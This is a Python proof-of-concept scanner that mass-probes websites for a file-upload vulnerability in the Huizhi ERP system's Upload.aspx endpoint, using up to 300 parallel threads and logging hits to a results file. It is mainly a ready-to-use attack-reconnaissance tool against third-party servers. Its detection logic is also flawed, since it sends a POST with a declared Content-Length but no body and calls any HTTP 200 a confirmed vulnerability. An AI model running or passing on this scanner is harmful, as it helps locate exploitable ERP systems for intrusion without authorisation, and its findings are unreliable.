import sys
import requests
import argparse
import time
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()  # 解除警告
RED_BOLD = "\033[1;31m"
RESET = "\033[0m"


def banner():
    banner = """汇智ERP系统Upload.aspx存在文件上传漏洞"""
    print(banner)


def main():
    banner()
    parser = argparse.ArgumentParser(description="汇智ERP系统Upload.aspx存在文件上传漏洞")
    parser.add_argument('-u', '--url', dest='url', type=str, help='input your link')
    parser.add_argument('-f', '--file', dest='file', type=str, help='input your file path')

    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for i in f.readlines():
                url_list.append(i.strip().replace('\n', ''))
        mp = Pool(300)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"\n\tuage:python {sys.argv[0]} -h")


def poc(target):
    headers = {
        "Content-Length": "1033",
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryLkkAXATqVKBHZ8zk",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5",
        "Connection": "close"
    }
    payload_url = '/nssys/common/Upload.aspx?Action=DNPageAjaxPostBack'
    url = target + payload_url
    try:
        res = requests.get(url=target, verify=False)
        if res.status_code == 200:
            res2 = requests.post(url=url, headers=headers, timeout=5, verify=False)
            if res2.status_code == 200:
                print(f'[+]该{target}存在文件上传漏洞')
                with open('result.txt', 'a', encoding='utf-8') as fp:
                    fp.write(target + '\n')
                    return True
            else:
                print(f'[-]该{target}不存在文件上传漏洞')
                return False
        else:
            print(f'[0]该{target}连接失败，请手动测试')
    except Exception as e:
        print(f'[*]该url{target}存在问题，请手动测试')
        return False
if __name__ == '__main__':
    main()